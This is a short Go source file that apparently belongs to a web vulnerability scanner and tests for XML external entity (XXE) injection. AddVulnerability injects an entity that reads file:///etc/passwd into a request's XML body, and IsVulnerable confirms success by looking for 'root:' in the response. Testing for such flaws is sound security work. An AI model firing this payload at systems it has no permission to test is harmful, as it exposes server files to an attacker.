package xxe

import (
	"bytes"
	"io"
	"net/http"
)

const kVulnerability = `
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>`

var kXMLStart []byte = []byte("<?xml")

func AddVulnerability(req *http.Request) (bool, error) {
	hadXML := false
	body, err := io.ReadAll(req.Body)
	if err != nil {
		return hadXML, err
	}

	xmlStart := bytes.Index(body, kXMLStart)

	if xmlStart != -1 {
		hadXML = true
		idx := xmlStart + bytes.IndexByte(body[xmlStart:], '>')
		body = bytes.Join([][]byte{body[:idx+1], []byte(kVulnerability)}, []byte{})
	}

	req.Body = io.NopCloser(bytes.NewReader(body))
	return hadXML, nil
}

func IsVulnerable(body []byte) bool {
	return bytes.Contains(body, []byte("root:"))
}
